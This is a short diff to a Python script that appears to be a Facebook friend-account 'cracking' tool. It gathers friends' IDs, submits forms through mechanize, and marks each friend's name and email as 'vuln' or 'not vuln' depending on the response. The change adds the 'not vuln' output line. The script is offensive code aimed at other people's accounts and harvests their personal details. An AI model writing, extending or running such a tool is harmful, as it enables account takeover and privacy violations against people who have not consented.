@@ -1,4 +1,3 @@
-
 from multiprocessing.pool import ThreadPool
 import json, os, time, zlib
 os.system("clear")
@@ -33,7 +32,7 @@ time.sleep(1)
 print ("Success Getting Friends Id.")
 time.sleep(1)
 print ("Cracking....\n")
-#mbul48
+
 def main(arg):
 	br = mechanize.Browser()
 	br.set_handle_robots(False)
@@ -59,6 +58,8 @@ def main(arg):
 			kmz = br.submit().read()
 			if "Maaf" in kmz:
 				print ("\x1b[0;0m[   \x1b[0;92mvuln   \x1b[0;0m]  \x1b[1;95m-  \x1b[0;92m" + b['name'] +  " - " + b['email'])
+			else:
+				print ("\x1b[0;0m[ \x1b[0;91mnot vuln \x1b[0;0m]  \x1b[1;95m-  \x1b[0;91m" + b['name'] +  " - " + b['email'])
 	
 	except KeyError:
 		pass
